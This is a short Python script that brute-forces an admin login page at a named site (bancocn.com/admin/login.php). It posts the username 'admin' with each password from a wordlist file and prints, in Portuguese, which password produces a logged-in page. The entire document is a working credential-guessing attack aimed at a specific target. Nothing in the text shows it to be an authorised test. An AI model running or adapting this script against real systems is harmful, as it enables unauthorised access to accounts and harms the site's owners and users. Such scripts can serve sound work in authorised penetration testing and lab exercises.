import requests

with open("wordlist.txt", "r") as file:
    wordlist = file.read().splitlines()


for word in wordlist:
    data = {"user": "admin", "password": word}
    response = requests.post("http://www.bancocn.com/admin/login.php", data=data)

    if "Logout" in response.text:
        print("Senha {} correta encontrada!".format(word))
    else:
        print("Senha {} incorreta.".format(word))
